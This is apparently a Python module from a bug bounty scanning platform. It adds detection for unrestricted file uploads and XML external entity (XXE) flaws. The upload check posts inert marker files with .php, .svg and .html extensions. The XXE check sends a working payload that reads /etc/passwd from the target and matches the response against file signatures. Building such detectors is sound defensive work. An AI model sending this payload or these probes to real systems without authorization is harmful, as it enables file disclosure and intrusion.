"""
ASM Platform — Bug Bounty pipeline: unrestricted file upload + XXE detection.

Neither vulnerability class was covered by any existing module -- both are
common, high-value real-world bug bounty findings (unrestricted upload is a
classic OWASP category; XXE is a standard finding on any endpoint that
parses XML/SVG/DOCX/XLSX). Both stay strictly detection-only:

- check_unrestricted_upload never uploads real executable code, only an
  inert file with a dangerous *extension* -- confirming the upload was
  accepted (not rejected) is the whole signal; whether it's actually
  web-accessible/executed needs a human to verify, so a hit is
  'inconclusive', same as every other accept/reject-shape candidate here.
- check_xxe targets only /etc/passwd (always world-readable, never itself
  sensitive beyond username enumeration) and reuses run_lfi's own proven,
  low-false-positive signature set (exploit_tools.py::LFI_SIGNATURES)
  instead of inventing a new confirmation heuristic -- a hit is 'confirmed',
  matching run_lfi's own severity/status discipline for the identical
  evidence shape (a real file's content came back).

See CHANGELOG.md.
"""
from typing import Any, Dict, List, Optional

import aiohttp
import structlog

from workers.bounty.exploit_tools import LFI_SIGNATURES

log = structlog.get_logger()

_UA = {"User-Agent": "Mozilla/5.0 (compatible; ASM-Bounty/1.0)"}

_UPLOAD_FIELD_NAMES = ["file", "image", "avatar", "attachment"]
_UPLOAD_TEST_FILES = [
    ("asm-upload-test.php", b"asm-bounty-upload-marker\n", "application/x-php"),
    ("asm-upload-test.svg", b'<svg xmlns="http://www.w3.org/2000/svg"><!-- asm-bounty-upload-marker --></svg>\n', "image/svg+xml"),
    ("asm-upload-test.html", b"<!-- asm-bounty-upload-marker -->\n", "text/html"),
]

_XXE_PAYLOAD = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
    "<root>&xxe;</root>"
)


async def check_unrestricted_upload(
    url: str, timeout: int = 20, extra_headers: Optional[Dict[str, str]] = None,
) -> List[Dict[str, Any]]:
    """POST a small, inert file carrying a dangerous extension via
    multipart/form-data across a few common field names; a 2xx acceptance
    (rather than the 4xx a properly-validated endpoint should return) is the
    candidate signal. Stops at first acceptance -- same "stop at first
    confirmation" discipline as every other candidate-flagging module here."""
    headers = {**_UA, **(extra_headers or {})}
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=timeout), headers=headers) as s:
        for filename, content, content_type in _UPLOAD_TEST_FILES:
            for field in _UPLOAD_FIELD_NAMES:
                form = aiohttp.FormData()
                form.add_field(field, content, filename=filename, content_type=content_type)
                try:
                    async with s.post(url, data=form, allow_redirects=False) as r:
                        status = r.status
                except Exception:
                    continue
                if status in (200, 201, 202):
                    return [{
                        "technique": f"unrestricted-upload-{filename.rsplit('.', 1)[-1]}",
                        "severity": "high",
                        "status": "inconclusive",
                        "evidence": {
                            "target_url": url, "filename": filename, "field": field, "status": status,
                            "note": (
                                "Server accepted a file with a potentially dangerous extension "
                                "rather than rejecting it -- confirm manually whether it ends up "
                                "web-accessible and whether that extension is served/executed unsafely."
                            ),
                        },
                    }]
    return []


async def check_xxe(
    url: str, timeout: int = 20, extra_headers: Optional[Dict[str, str]] = None,
) -> List[Dict[str, Any]]:
    """POST a classic external-entity payload targeting /etc/passwd (always
    world-readable, never itself sensitive) and check for the response
    matching run_lfi's own signature set. Read-only -- an XXE payload that
    could write/delete/SSRF is a different, more aggressive class this
    module deliberately doesn't attempt."""
    headers = {**_UA, **(extra_headers or {}), "Content-Type": "application/xml"}
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=timeout), headers=headers) as s:
            async with s.post(url, data=_XXE_PAYLOAD, allow_redirects=False) as r:
                body = (await r.content.read(65536)).decode(errors="ignore")
    except Exception as exc:
        log.warning("bounty_xxe_error", url=url, error=str(exc)[:200])
        return []

    signature = next((sig.pattern for sig in LFI_SIGNATURES if sig.search(body)), None)
    if not signature:
        return []
    return [{
        "technique": "xxe-file-read",
        "severity": "critical",
        "status": "confirmed",
        "evidence": {
            "target_url": url, "matched_signature": signature, "excerpt": body[:300],
            "note": "XML external entity resolved and read a local file -- confirmed via a known file-content signature.",
        },
    }]
